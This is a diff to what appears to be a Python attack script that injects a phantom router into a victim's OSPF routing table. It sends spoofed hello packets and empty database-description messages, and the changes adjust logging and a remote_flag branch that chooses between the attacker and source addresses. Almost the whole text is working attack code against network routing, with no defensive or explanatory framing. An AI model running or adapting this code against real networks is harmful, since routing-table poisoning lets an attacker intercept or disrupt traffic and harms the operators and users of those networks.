@@ -61,7 +61,7 @@ def send_hello_packet(iface, srcMAC, dstMAC, srcIP, dstIP, identification_number
 
 	sendp(frame, iface=iface)
 	#frame.show()
-	log('sent hello message (%s)' % identification_number, 'red')
+	log('sent hello message\nidentification number %s' % identification_number, 'red')
 
 
 def send_empty_dbd_messages(iface, srcMAC, dstMAC, srcIP, dstIP, identification_number, ttl, n, interval):
@@ -96,7 +96,7 @@ def send_empty_dbd_messages(iface, srcMAC, dstMAC, srcIP, dstIP, identification_
 
 		sendp(frame, iface=iface)
 		#frame.show()
-		log('sent dbd message %d with seqNum %d (%d)' % (i+1, seqNum + i, identification_number), 'red')
+		log('sent dbd message %d\nsequence number %d\nidentification number %d' % (i+1, seqNum + i, identification_number), 'red')
 
 		identification_number = identification_number + 1
 
@@ -141,22 +141,25 @@ def main():
 	identification_number = randint(MAX_I_N/4, MAX_I_N*3/4)
 
 	# first hello message to let victim know about the phantom router
-	if remote_flag != 1:
-		send_hello_packet(iface, src_mac_address, HELLO_DESTINATION_MAC_ADDRESS, ATTACKER_SOURCE_ADDRESS, HELLO_DESTINATION_ADDRESS, identification_number, ttl)
+	if remote_flag == 0:
+		send_hello_packet(iface, src_mac_address, HELLO_DESTINATION_MAC_ADDRESS, SOURCE_ADDRESS, HELLO_DESTINATION_ADDRESS, identification_number, ttl)
 	else:
 		send_hello_packet(iface, src_mac_address, dst_mac_address, ATTACKER_SOURCE_ADDRESS, DESTINATION_ADDRESS, identification_number, ttl)
 
 	identification_number = identification_number + 1
 
 	# empty dbd messages to let the victime send over the network its dbd updates
-	send_empty_dbd_messages(iface, src_mac_address, dst_mac_address, ATTACKER_SOURCE_ADDRESS, DESTINATION_ADDRESS, identification_number, ttl, ATTACK_DBD_MESSAGES, ATTACK_DBD_INTERVAL)
+	if remote_flag == 0:
+		send_empty_dbd_messages(iface, src_mac_address, dst_mac_address, SOURCE_ADDRESS, DESTINATION_ADDRESS, identification_number, ttl, ATTACK_DBD_MESSAGES, ATTACK_DBD_INTERVAL)
+	else:
+		send_empty_dbd_messages(iface, src_mac_address, dst_mac_address, ATTACKER_SOURCE_ADDRESS, DESTINATION_ADDRESS, identification_number, ttl, ATTACK_DBD_MESSAGES, ATTACK_DBD_INTERVAL)
 
 	identification_number = identification_number + ATTACK_DBD_MESSAGES
 
 	# hello pakets to persist the presence of the phantom router 
 	# on the victim router routing table
-	if remote_flag != 1:
-		send_hello_packets(iface, src_mac_address, HELLO_DESTINATION_MAC_ADDRESS, ATTACKER_SOURCE_ADDRESS, DESTINATION_ADDRESS, identification_number, ttl, ATTACK_HELLO_INTERVAL)
+	if remote_flag == 0:
+		send_hello_packets(iface, src_mac_address, HELLO_DESTINATION_MAC_ADDRESS, SOURCE_ADDRESS, HELLO_DESTINATION_ADDRESS, identification_number, ttl, ATTACK_HELLO_INTERVAL)
 	else:
 		send_hello_packets(iface, src_mac_address, dst_mac_address, ATTACKER_SOURCE_ADDRESS, DESTINATION_ADDRESS, identification_number, ttl, ATTACK_HELLO_INTERVAL)
 
